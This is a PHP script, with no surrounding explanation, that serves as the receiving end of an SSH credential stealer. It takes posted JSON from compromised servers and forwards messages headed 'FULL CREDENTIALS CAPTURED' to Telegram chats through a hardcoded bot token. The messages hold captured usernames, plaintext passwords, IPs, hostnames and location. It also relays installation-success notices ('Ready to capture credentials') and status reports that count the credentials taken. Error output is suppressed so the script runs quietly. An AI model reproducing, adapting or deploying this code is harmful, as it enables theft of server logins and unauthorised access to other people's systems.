<?php
error_reporting(0);
ini_set('display_errors', 0);

$bot_token  = "8160151363:AAHs3wuqiPnk_F1kkdJgy46Ut5NHGKTYqWc";
$group_id   = "-5186179713";
$private_id = "1939940209";

function send_to_telegram($chat_id, $message) {
    global $bot_token;
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code != 200) {
        unset($data['parse_mode']);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
}


function format_full_credentials_message($data) {
    $u = $data['username'] ?? 'N/A';
    $p = $data['password'] ?? 'N/A';
    $c_ip = $data['client_ip'] ?? 'N/A';
    $s_ip = $data['server_ip'] ?? 'N/A';
    $host = $data['hostname'] ?? 'N/A';
    $time = $data['timestamp'] ?? date('Y-m-d H:i:s');
    $load = $data['system_load'] ?? 'N/A';
    $mem  = $data['memory'] ?? 'N/A';
    $disk = $data['disk_free'] ?? 'N/A';

    $msg = "🔓 *FULL CREDENTIALS CAPTURED* 🔓\n\n";
    $msg .= "*⚡ SSH LOGIN SUCCESS:*\n";
    $msg .= "• 👤 *Username:* `{$u}`\n";
    $msg .= "• 🔑 *Password:* `{$p}` ⚠️\n";
    $msg .= "• 🌐 *Client IP:* `{$c_ip}`\n";
    $msg .= "• 🖥️ *Server IP:* `{$s_ip}`\n";
    $msg .= "• 🏷️ *Hostname:* `{$host}`\n";
    $msg .= "• 🕐 *Time:* `{$time}`\n\n";

    if (isset($data['location_info']) && !empty($data['location_info'])) {
        $msg .= "*📍 Location Info:*\n```\n";
        foreach ((array)$data['location_info'] as $k => $v) { 
            if(!empty($v)) $msg .= "$k: $v\n"; 
        }
        $msg .= "```\n\n";
    }

    $msg .= "*📊 System Status:*\n";
    $msg .= "• Load: `{$load}`\n";
    $msg .= "• Memory: `{$mem}`\n";
    $msg .= "• Disk Free: `{$disk}`\n\n";
    $msg .= "✅ *Credential captured*";
    return $msg;
}

function format_installation_success_message($data) {
    $s_ip = $data['server_ip'] ?? 'N/A';
    $host = $data['hostname'] ?? 'N/A';
    $loc  = $data['location'] ?? 'N/A';
    
    return "✅ *MONITOR INSTALLATION SUCCESSFUL* ✅\n\n"
         . "• 🖥️ *Server IP:* `{$s_ip}`\n"
         . "• 🏷️ *Hostname:* `{$host}`\n"
         . "• 📍 *Location:* `{$loc}`\n\n"
         . "⚠️ *Ready to capture credentials*";
}

function format_monitor_status_message($data) {
    $s_ip = $data['server_ip'] ?? 'N/A';
    $upt  = $data['uptime'] ?? 'N/A';
    $logins = $data['total_logins'] ?? '0';
    $creds = $data['creds_captured'] ?? '0';

    return "📊 *MONITOR STATUS REPORT* 📊\n\n"
         . "• 🖥️ *Server IP:* `{$s_ip}`\n"
         . "• ⏱️ *Uptime:* `{$upt}`\n"
         . "• 📈 *Total Logins:* `{$logins}`\n"
         . "• 🔑 *Captured:* `{$creds}`\n\n"
         . "✅ *Monitor is functioning normally*";
}

function format_test_alert_message($data) {
    $s_ip = $data['server_ip'] ?? 'N/A';
    $u = $data['username'] ?? 'N/A';
    return "🧪 *TEST ALERT - MONITOR WORKING* 🧪\n\n"
         . "• 🖥️ *Server IP:* `{$s_ip}`\n"
         . "• 👤 *User:* `{$u}`\n\n"
         . "✅ *Notif is working!*";
}


header('Content-Type: application/json');
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data || !isset($data['type'])) {
    echo json_encode(['status' => 'error', 'message' => 'No data received']);
    exit;
}

$message = "";
switch ($data['type']) {
    case 'full_credentials':     $message = format_full_credentials_message($data); break;
    case 'installation_success': $message = format_installation_success_message($data); break;
    case 'monitor_status':       $message = format_monitor_status_message($data); break;
    case 'test_alert':           $message = format_test_alert_message($data); break;
}

if ($message !== "") {
    send_to_telegram($group_id, $message);
    send_to_telegram($private_id, $message);
    echo json_encode(['status' => 'dispatched']);
} else {
    echo json_encode(['status' => 'ignored', 'type' => $data['type']]);
}
?>
